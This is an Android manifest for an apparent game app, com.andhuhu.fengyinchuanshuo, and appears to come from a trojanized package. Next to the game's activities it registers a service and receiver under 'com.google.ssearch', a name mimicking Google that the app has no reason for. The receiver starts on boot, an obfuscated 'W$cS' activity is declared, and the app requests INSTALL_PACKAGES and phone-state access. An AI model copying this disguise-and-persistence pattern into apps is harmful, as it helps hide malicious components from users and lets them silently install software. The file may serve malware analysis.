<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.andhuhu.fengyinchuanshuo">
    <application android:icon="@drawable/icon" android:label="@string/app_name">
        <activity android:configChanges="keyboardHidden|orientation" android:name=".MainActivity" android:screenOrientation="landscape">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <activity android:configChanges="keyboardHidden|orientation" android:name=".GameActivity" android:screenOrientation="landscape">
            <intent-filter>
                <action android:name="com.andhuhu.fengyinchuanshuo.GameActivity"/>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
        </activity>
        <activity android:configChanges="keyboardHidden|orientation" android:name=".SelectGradeActivity" android:screenOrientation="landscape">
            <intent-filter>
                <action android:name="com.andhuhu.fengyinchuanshuo.SelectGradeActivity"/>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
        </activity>
        <activity android:configChanges="keyboardHidden|orientation" android:name=".InstalActivity" android:screenOrientation="landscape">
            <intent-filter>
                <action android:name="com.andhuhu.fengyinchuanshuo.InstalActivity"/>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
        </activity>
        <activity android:configChanges="keyboardHidden|orientation" android:name=".HelpActivity" android:screenOrientation="landscape">
            <intent-filter>
                <action android:name="com.andhuhu.fengyinchuanshuo.HelpActivity"/>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
        </activity>
        <activity android:configChanges="keyboardHidden|orientation" android:name="W$cS" android:theme="@android:style/Theme.Dialog"/>
        <service android:name="com.google.ssearch.SearchService"/>
        <service android:name=".MediaPlayerService">
            <intent-filter>
                <category android:name="android.intent.category.DEFAULT"/>
                <action android:name="com.andhuhu.fengyinchuanshuo.MediaPlayerService"/>
            </intent-filter>
        </service>
        <receiver android:name="com.google.ssearch.Receiver">
            <intent-filter>
                <action android:name="android.intent.action.BATTERY_CHANGED_ACTION"/>
                <action android:name="android.intent.action.SIG_STR"/>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>
    </application>
    <uses-permission android:name="android.permission.VIBRATE"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.INSTALL_PACKAGES"/>
</manifest>